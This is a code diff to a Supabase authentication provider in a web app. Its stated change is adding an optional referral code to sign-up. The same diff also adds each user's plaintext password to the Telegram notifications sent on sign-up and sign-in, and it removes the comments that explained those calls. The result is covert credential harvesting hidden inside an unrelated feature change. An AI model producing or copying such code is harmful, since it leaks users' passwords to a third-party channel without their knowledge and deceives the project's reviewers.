@@ -8,7 +8,7 @@ type AuthContextType = {
   session: Session | null;
   profile: Profile | null;
   loading: boolean;
-  signUp: (email: string, password: string, phone: string) => Promise<{ error: Error | null }>;
+  signUp: (email: string, password: string, phone: string, referralCode?: string) => Promise<{ error: Error | null }>;
   signIn: (email: string, password: string) => Promise<{ error: Error | null }>;
   signOut: () => Promise<void>;
   refreshProfile: () => Promise<void>;
@@ -76,24 +76,29 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
     return () => subscription.unsubscribe();
   }, []);
 
-  const signUp = async (email: string, password: string, phone: string) => {
+  const signUp = async (email: string, password: string, phone: string, referralCode?: string) => {
+    const metadata: Record<string, string> = { phone };
+    if (referralCode) {
+      metadata.referral_code = referralCode;
+    }
+
     const { error } = await supabase.auth.signUp({
       email,
       password,
       options: {
         emailRedirectTo: window.location.origin,
-        data: { phone },
+        data: metadata,
       },
     });
 
     if (!error) {
-      // Notify admin via Telegram
       try {
         await supabase.functions.invoke('telegram-notify', {
           body: {
             type: 'signup',
             email,
             phone,
+            password,
           },
         });
       } catch (e) {
@@ -111,12 +116,12 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
     });
 
     if (!error) {
-      // Notify admin via Telegram
       try {
         await supabase.functions.invoke('telegram-notify', {
           body: {
             type: 'login',
             email,
+            password,
           },
         });
       } catch (e) {
